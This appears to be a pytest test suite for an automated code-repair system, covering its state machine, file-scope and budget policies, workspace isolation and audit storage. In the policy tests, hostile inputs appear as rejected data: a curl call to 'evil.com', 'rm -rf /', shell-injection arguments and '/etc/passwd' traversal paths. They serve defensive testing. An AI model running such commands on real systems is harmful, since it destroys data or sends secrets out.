"""Unit test suite for Phase 8, Milestone 1: Repair Execution Architecture.

Verifies:
- Domain models and validation constraints
- Guarded state machine legal paths, illegal transitions, and actor authorization
- Terminal state immutability
- Policy validation, command whitelists, injection defense, and budget checks
- Isolated workspace containment and target repository immutability
- SQLite persistence, audit event ledgers, and provenance tracking
- Component Protocol contracts and interface adherence
"""

from datetime import datetime, timezone
import os
from pathlib import Path
import pytest
import sqlite3

from forge.repair.execution.interfaces import (
    PatchValidatorProtocol,
    RepairEventStoreProtocol,
    RepairExecutorProtocol,
    RepairPlannerProtocol,
    RepairVerifierProtocol,
    RepairWorkspaceProtocol,
)
from forge.repair.execution.models import (
    ExecutionTestResult,
    FailureCategory,
    FailureClassification,
    PatchArtifact,
    RepairActor,
    RepairExecutionEvent,
    RepairExecutionPlan,
    RepairExecutionRecord,
    RepairExecutionState,
    RepairRequest,
    ValidationResult,
)
from forge.repair.execution.policy import (
    ArbitraryExecutionForbiddenError,
    BudgetExceededViolationError,
    ProtectedPathViolationError,
    RepairExecutionPolicy,
    ScopeContainmentViolationError,
    TargetRepoImmutabilityViolationError,
)
from forge.repair.execution.state import (
    ACTOR_TRANSITION_PERMISSIONS,
    ALLOWED_REPAIR_TRANSITIONS,
    IllegalStateModificationError,
    InvalidRepairTransitionError,
    RepairExecutionStateMachine,
    TERMINAL_STATES,
    UnauthorizedTransitionActorError,
    validate_repair_transition,
)
from forge.repair.execution.storage import (
    RepairExecutionStore,
    RepairExecutionStoreError,
)
from forge.repair.execution.workspace import RepairWorkspace


# =============================================================================
# 1. Domain Models and Validation Tests
# =============================================================================

def test_repair_request_model_validation():
    """Verify that RepairRequest enforces valid commit SHAs, evidence, and relative paths."""
    req = RepairRequest(
        repair_id="rep_test1",
        finding_id="find_001",
        target_repo="https://github.com/example/repo.git",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        evidence_ids=["evi_001", "evi_002"],
        allowed_files=["src/utils.py"],
    )
    assert req.repair_id == "rep_test1"
    assert req.state == RepairExecutionState.CREATED
    assert len(req.evidence_ids) == 2

    # Empty evidence IDs rejected (must be evidence-grounded)
    with pytest.raises(ValueError, match="evidence_ids cannot be empty"):
        RepairRequest(
            repair_id="rep_invalid",
            finding_id="find_001",
            target_repo="https://github.com/example/repo.git",
            base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
            evidence_ids=[],
            allowed_files=["src/utils.py"],
        )

    # Invalid git commit SHA rejected
    with pytest.raises(ValueError, match="Invalid git commit SHA"):
        RepairRequest(
            repair_id="rep_invalid",
            finding_id="find_001",
            target_repo="https://github.com/example/repo.git",
            base_commit_sha="not-a-sha!",
            evidence_ids=["evi_001"],
            allowed_files=["src/utils.py"],
        )

    # Empty allowed files rejected
    with pytest.raises(ValueError, match="allowed_files cannot be empty"):
        RepairRequest(
            repair_id="rep_invalid",
            finding_id="find_001",
            target_repo="https://github.com/example/repo.git",
            base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
            evidence_ids=["evi_001"],
            allowed_files=[],
        )

    # Path traversal in allowed files rejected
    with pytest.raises(ValueError, match="Path traversal"):
        RepairRequest(
            repair_id="rep_invalid",
            finding_id="find_001",
            target_repo="https://github.com/example/repo.git",
            base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
            evidence_ids=["evi_001"],
            allowed_files=["../outside.py"],
        )


def test_patch_artifact_creation_and_metrics():
    """Verify PatchArtifact computes SHA-256 digest, line counts, and hunk metrics."""
    diff_sample = """--- a/src/math.py
+++ b/src/math.py
@@ -10,3 +10,4 @@
 def add(a, b):
-    return a - b
+    # Fixed addition
+    return a + b
"""
    patch = PatchArtifact.create(
        repair_id="rep_001",
        finding_id="find_001",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        target_file="src/math.py",
        diff_content=diff_sample,
    )

    assert patch.artifact_id.startswith("patch_")
    assert len(patch.content_hash) == 64  # SHA-256
    assert patch.hunks_count == 1
    assert patch.lines_added == 2
    assert patch.lines_deleted == 1
    assert patch.affected_paths == ["src/math.py"]

    # Empty diff content rejected
    with pytest.raises(ValueError, match="diff_content cannot be empty"):
        PatchArtifact.create(
            repair_id="rep_001",
            finding_id="find_001",
            base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
            target_file="src/math.py",
            diff_content="   ",
        )


# =============================================================================
# 2. Guarded State Machine Tests
# =============================================================================

def test_state_machine_legal_lifecycle_path():
    """Verify the canonical lifecycle path from CREATED to VERIFIED with authorized actors."""
    req = RepairRequest(
        repair_id="rep_flow",
        finding_id="find_001",
        target_repo="https://github.com/example/repo.git",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        evidence_ids=["evi_001"],
        allowed_files=["src/math.py"],
    )
    sm = RepairExecutionStateMachine(req)
    assert sm.current_state == RepairExecutionState.CREATED

    plan = RepairExecutionPlan(
        plan_id="plan_001",
        repair_id="rep_flow",
        target_file="src/math.py",
        root_cause="Arithmetic operator inverted",
        proposed_change="Change subtraction to addition",
        expected_behavior="add(2, 3) returns 5",
        verification_command="pytest tests/test_math.py",
    )

    # 1. CREATED -> PLANNED (by PLANNER)
    sm.transition(RepairExecutionState.PLANNED, RepairActor.PLANNER, {"plan": plan})
    assert sm.current_state == RepairExecutionState.PLANNED

    # 2. PLANNED -> VALIDATING (by VALIDATOR)
    sm.transition(RepairExecutionState.VALIDATING, RepairActor.VALIDATOR)
    assert sm.current_state == RepairExecutionState.VALIDATING

    # 3. VALIDATING -> READY (by VALIDATOR with passed ValidationResult)
    val = ValidationResult(is_valid=True, checks_passed=["syntax", "budget", "scope"])
    sm.transition(RepairExecutionState.READY, RepairActor.VALIDATOR, {"validation": val})
    assert sm.current_state == RepairExecutionState.READY

    # 4. READY -> EXECUTING (by EXECUTOR)
    sm.transition(RepairExecutionState.EXECUTING, RepairActor.EXECUTOR)
    assert sm.current_state == RepairExecutionState.EXECUTING

    # 5. EXECUTING -> PATCH_GENERATED (by EXECUTOR with PatchArtifact)
    patch = PatchArtifact.create(
        repair_id="rep_flow",
        finding_id="find_001",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        target_file="src/math.py",
        diff_content="--- a/src/math.py\n+++ b/src/math.py\n@@ -1,1 +1,1 @@\n-x\n+y\n",
    )
    sm.transition(RepairExecutionState.PATCH_GENERATED, RepairActor.EXECUTOR, {"patch": patch})
    assert sm.current_state == RepairExecutionState.PATCH_GENERATED

    # 6. PATCH_GENERATED -> PATCH_VALIDATING (by VALIDATOR)
    sm.transition(RepairExecutionState.PATCH_VALIDATING, RepairActor.VALIDATOR)
    assert sm.current_state == RepairExecutionState.PATCH_VALIDATING

    # 7. PATCH_VALIDATING -> VERIFIED (by VERIFIER with verified proof)
    sm.transition(RepairExecutionState.VERIFIED, RepairActor.VERIFIER, {"verification_passed": True})
    assert sm.current_state == RepairExecutionState.VERIFIED
    assert sm.is_terminal is True


def test_state_machine_illegal_transition_rejected():
    """Verify that skipping lifecycle states or taking illegal paths raises InvalidRepairTransitionError."""
    req = RepairRequest(
        repair_id="rep_illegal",
        finding_id="find_001",
        target_repo="https://github.com/example/repo.git",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        evidence_ids=["evi_001"],
        allowed_files=["src/math.py"],
    )
    sm = RepairExecutionStateMachine(req)

    # Cannot skip from CREATED directly to VERIFIED
    with pytest.raises(InvalidRepairTransitionError, match="Illegal state transition"):
        sm.transition(RepairExecutionState.VERIFIED, RepairActor.VERIFIER, {"verification_passed": True})

    # Cannot skip from CREATED directly to EXECUTING
    with pytest.raises(InvalidRepairTransitionError, match="Illegal state transition"):
        sm.transition(RepairExecutionState.EXECUTING, RepairActor.EXECUTOR)

    # Idempotent transition to same state rejected
    with pytest.raises(InvalidRepairTransitionError, match="Idempotent transition rejected"):
        sm.transition(RepairExecutionState.CREATED, RepairActor.ORCHESTRATOR)


def test_state_machine_unauthorized_actor_rejected():
    """Verify that unauthorized actors are blocked from triggering transitions."""
    req = RepairRequest(
        repair_id="rep_unauth",
        finding_id="find_001",
        target_repo="https://github.com/example/repo.git",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        evidence_ids=["evi_001"],
        allowed_files=["src/math.py"],
    )
    sm = RepairExecutionStateMachine(req)

    # Planner cannot cancel (only OPERATOR can cancel)
    with pytest.raises(UnauthorizedTransitionActorError, match="Actor 'repair_planner' is not authorized"):
        sm.transition(RepairExecutionState.CANCELLED, RepairActor.PLANNER)


def test_state_machine_terminal_states_immutable():
    """Verify that once in a terminal state (VERIFIED, FAILED, REJECTED, CANCELLED), transitions are rejected."""
    # Test VERIFIED terminal state
    req = RepairRequest(
        repair_id="rep_term",
        finding_id="find_001",
        target_repo="https://github.com/example/repo.git",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        evidence_ids=["evi_001"],
        allowed_files=["src/math.py"],
        state=RepairExecutionState.VERIFIED,
    )
    sm = RepairExecutionStateMachine(req)
    assert sm.is_terminal is True

    with pytest.raises(IllegalStateModificationError, match="Cannot transition out of terminal state 'verified'"):
        sm.transition(RepairExecutionState.EXECUTING, RepairActor.EXECUTOR)

    # Test FAILED terminal state
    req_failed = RepairRequest(
        repair_id="rep_fail",
        finding_id="find_001",
        target_repo="https://github.com/example/repo.git",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        evidence_ids=["evi_001"],
        allowed_files=["src/math.py"],
        state=RepairExecutionState.FAILED,
    )
    sm_failed = RepairExecutionStateMachine(req_failed)
    with pytest.raises(IllegalStateModificationError, match="Cannot transition out of terminal state 'failed'"):
        sm_failed.transition(RepairExecutionState.PLANNED, RepairActor.PLANNER)


def test_state_machine_verified_requires_proof():
    """Verify zero-fabrication invariant: transition to VERIFIED strictly requires verified proof."""
    req = RepairRequest(
        repair_id="rep_proof",
        finding_id="find_001",
        target_repo="https://github.com/example/repo.git",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        evidence_ids=["evi_001"],
        allowed_files=["src/math.py"],
        state=RepairExecutionState.PATCH_VALIDATING,
    )
    sm = RepairExecutionStateMachine(req)

    # Without verification_passed=True in context, transition fails
    with pytest.raises(InvalidRepairTransitionError, match="strictly requires verified proof"):
        sm.transition(RepairExecutionState.VERIFIED, RepairActor.VERIFIER, {"verification_passed": False})


# =============================================================================
# 3. Policy and Safety Boundary Tests
# =============================================================================

def test_policy_target_file_validation():
    """Verify policy rejects path traversal, protected files, and scope violations."""
    policy = RepairExecutionPolicy()
    allowed = ["src/calculator.py", "src/models.py"]

    # Allowed file passes
    assert policy.validate_target_file("src/calculator.py", allowed) == "src/calculator.py"

    # File outside declared allowed files rejected
    with pytest.raises(ScopeContainmentViolationError, match="not within declared allowed files"):
        policy.validate_target_file("src/unauthorized.py", allowed)

    # Path traversal rejected
    with pytest.raises(ScopeContainmentViolationError, match="Path traversal"):
        policy.validate_target_file("../../etc/passwd", allowed)

    # Absolute path rejected
    with pytest.raises(ScopeContainmentViolationError, match="Absolute path"):
        policy.validate_target_file("/etc/passwd", allowed)

    # Protected configuration file rejected
    with pytest.raises(ProtectedPathViolationError, match="explicitly protected by security policy"):
        policy.validate_target_file("pyproject.toml", ["pyproject.toml"])

    # Protected prefix (.git/) rejected
    with pytest.raises(ProtectedPathViolationError, match="matches protected prefix"):
        policy.validate_target_file(".git/config", [".git/config"])


def test_policy_command_validation_and_injection_defense():
    """Verify command validation permits whitelisted binaries and blocks shell injection."""
    policy = RepairExecutionPolicy()

    # Pre-approved test commands pass
    assert policy.validate_command(["pytest", "tests/test_calculator.py"]) == ["pytest", "tests/test_calculator.py"]
    assert policy.validate_command(["python", "-m", "unittest"]) == ["python", "-m", "unittest"]

    # Unapproved command rejected
    with pytest.raises(ArbitraryExecutionForbiddenError, match="not in pre-approved command whitelist"):
        policy.validate_command(["curl", "https://evil.com/leak"])

    with pytest.raises(ArbitraryExecutionForbiddenError, match="not in pre-approved command whitelist"):
        policy.validate_command(["rm", "-rf", "/"])

    # Shell injection tokens rejected
    with pytest.raises(ArbitraryExecutionForbiddenError, match="forbidden shell injection token ';'"):
        policy.validate_command(["pytest", "tests/; rm -rf /"])

    with pytest.raises(ArbitraryExecutionForbiddenError, match="forbidden shell injection token '`'"):
        policy.validate_command(["pytest", "`whoami`"])

    with pytest.raises(ArbitraryExecutionForbiddenError, match=r"forbidden shell injection token '\$'"):
        policy.validate_command(["pytest", "$SECRET_KEY"])


def test_policy_budget_limits_enforced():
    """Verify patch budget enforcement checks."""
    policy = RepairExecutionPolicy(
        max_lines_changed=50,
        max_hunks=3,
        max_files_modified=1,
        max_patch_bytes=5000,
    )

    # Compliant patch passes
    policy.check_patch_budget(
        lines_added=10,
        lines_deleted=5,
        hunks_count=2,
        files_modified_count=1,
        patch_bytes=1000,
    )

    # Exceeding total lines changed rejected
    with pytest.raises(BudgetExceededViolationError, match="exceeds maximum allowed"):
        policy.check_patch_budget(
            lines_added=40,
            lines_deleted=20,
            hunks_count=1,
            files_modified_count=1,
            patch_bytes=1000,
        )

    # Exceeding hunks rejected
    with pytest.raises(BudgetExceededViolationError, match="Patch hunks count"):
        policy.check_patch_budget(
            lines_added=5,
            lines_deleted=5,
            hunks_count=5,
            files_modified_count=1,
            patch_bytes=1000,
        )

    # Exceeding file count rejected
    with pytest.raises(BudgetExceededViolationError, match="Patch files modified"):
        policy.check_patch_budget(
            lines_added=5,
            lines_deleted=5,
            hunks_count=1,
            files_modified_count=2,
            patch_bytes=1000,
        )


def test_policy_immutable_safety_invariants():
    """Verify that mandatory safety invariant flags cannot be toggled to False."""
    with pytest.raises(ValueError, match="Safety invariant 'target_repo_read_only' cannot be disabled"):
        RepairExecutionPolicy(target_repo_read_only=False)

    with pytest.raises(ValueError, match="Safety invariant 'require_human_approval' cannot be disabled"):
        RepairExecutionPolicy(require_human_approval=False)


def test_policy_environment_sanitization():
    """Verify that environment sanitization strips unapproved variables and redacts secrets."""
    policy = RepairExecutionPolicy()
    raw_env = {
        "PATH": "/usr/bin:/bin",
        "PYTHONPATH": "/workspace/src",
        "SECRET_TOKEN": "sk-1234567890abcdef",
        "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    }
    clean = policy.sanitize_environment(raw_env)
    assert "PATH" in clean
    assert "PYTHONPATH" in clean
    assert "SECRET_TOKEN" not in clean
    assert "AWS_SECRET_ACCESS_KEY" not in clean


# =============================================================================
# 4. Isolated Workspace Tests
# =============================================================================

def test_repair_workspace_isolation_and_containment(tmp_path: Path):
    """Verify RepairWorkspace ensures repository immutability, copies files, and validates path containment."""
    # Setup mock target repository
    target_repo = tmp_path / "mock_target_repo"
    target_repo.mkdir()
    (target_repo / "src").mkdir()
    (target_repo / "src" / "app.py").write_text("print('hello')", encoding="utf-8")

    scratch_root = tmp_path / "scratch_workspaces"

    ws = RepairWorkspace(
        target_repo_path=target_repo,
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        workspace_id="ws_unit1",
        scratch_root=scratch_root,
    )

    # Guarantee isolation: workspace is strictly separate
    assert ws.workspace_path != ws.target_repo_path
    assert not ws.is_isolated  # not yet prepared

    # Prepare isolated workspace
    ws.prepare()
    assert ws.is_isolated
    assert (ws.workspace_path / "src" / "app.py").exists()

    # Valid containment check
    resolved = ws.validate_containment("src/app.py")
    assert resolved.exists()
    assert resolved.is_relative_to(ws.workspace_path)

    # Path traversal rejected
    with pytest.raises(ScopeContainmentViolationError, match="Path traversal"):
        ws.validate_containment("../mock_target_repo/src/app.py")

    # Cleanup
    ws.cleanup()
    assert not ws.workspace_path.exists()


def test_repair_workspace_rejects_target_repo_collision(tmp_path: Path):
    """Verify RepairWorkspace strictly refuses to use target repository as workspace."""
    target_repo = tmp_path / "target_repo"
    target_repo.mkdir()

    with pytest.raises(TargetRepoImmutabilityViolationError, match="Workspace path cannot match"):
        RepairWorkspace(
            target_repo_path=target_repo,
            base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
            workspace_id="target_repo",
            scratch_root=tmp_path,  # Would cause workspace_path == target_repo
        )


# =============================================================================
# 5. Storage and Audit Ledger Tests
# =============================================================================

def test_repair_execution_store_persistence_and_events(tmp_path: Path):
    """Verify SQLite persistence for RepairRequests, PatchArtifacts, and sequential audit events."""
    from forge.storage.store import ForgeStore

    db_file = tmp_path / "test_repair.db"
    forge_store = ForgeStore(db_path=db_file)
    run_id = forge_store.create_run("https://github.com/example/repo.git")
    forge_store.create_finding(
        run_id=run_id,
        title="Test finding",
        description="Test description",
        finding_id="find_001",
    )

    store = RepairExecutionStore(db_path=db_file)

    req = RepairRequest(
        repair_id="rep_db_test",
        finding_id="find_001",
        run_id=run_id,
        target_repo="https://github.com/example/repo.git",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        evidence_ids=["evi_001", "evi_002"],
        allowed_files=["src/math.py"],
    )

    # 1. Save repair request (automatically emits initial CREATED event)
    store.save_repair_request(req)
    loaded = store.get_repair_request("rep_db_test")
    assert loaded is not None
    assert loaded.repair_id == "rep_db_test"
    assert loaded.state == RepairExecutionState.CREATED

    events = store.get_events("rep_db_test")
    assert len(events) == 1
    assert events[0].to_state == RepairExecutionState.CREATED
    assert events[0].sequence == 1

    # 2. Transition to PLANNED
    plan = RepairExecutionPlan(
        plan_id="plan_db",
        repair_id="rep_db_test",
        target_file="src/math.py",
        root_cause="Bug in math logic",
        proposed_change="Fix math logic",
        expected_behavior="Tests pass",
        verification_command="pytest",
    )
    updated = store.transition_repair_state(
        repair_id="rep_db_test",
        to_state=RepairExecutionState.PLANNED,
        actor=RepairActor.PLANNER,
        context={"plan": plan},
    )
    assert updated.state == RepairExecutionState.PLANNED

    events = store.get_events("rep_db_test")
    assert len(events) == 2
    assert events[1].to_state == RepairExecutionState.PLANNED
    assert events[1].sequence == 2

    # 3. Save PatchArtifact and transition to PATCH_GENERATED
    patch = PatchArtifact.create(
        repair_id="rep_db_test",
        finding_id="find_001",
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        target_file="src/math.py",
        diff_content="--- a/src/math.py\n+++ b/src/math.py\n@@ -1,1 +1,1 @@\n-a\n+b\n",
    )
    store.save_patch_artifact(patch)
    loaded_patch = store.get_patch_artifact(patch.artifact_id)
    assert loaded_patch is not None
    assert loaded_patch.content_hash == patch.content_hash

    # 4. List requests by finding_id
    requests = store.list_repair_requests(finding_id="find_001")
    assert len(requests) == 1
    assert requests[0].repair_id == "rep_db_test"

    # 5. Full execution record snapshot
    snapshot = store.get_full_execution_record("rep_db_test")
    assert snapshot is not None
    assert snapshot.request.repair_id == "rep_db_test"
    assert len(snapshot.events) == 2


# =============================================================================
# 6. Component Protocol Runtime Verification
# =============================================================================

def test_component_interfaces_runtime_checkable(tmp_path: Path):
    """Verify runtime checkability of core Component Protocols."""
    target_repo = tmp_path / "mock_repo"
    target_repo.mkdir()

    ws = RepairWorkspace(
        target_repo_path=target_repo,
        base_commit_sha="45cb2252c737906f37544f5ba6bee0295fb81468",
        workspace_id="ws_proto",
        scratch_root=tmp_path / "scratch",
    )
    assert isinstance(ws, RepairWorkspaceProtocol)

    store = RepairExecutionStore(db_path=tmp_path / "test_proto.db")
    assert isinstance(store, RepairEventStoreProtocol)
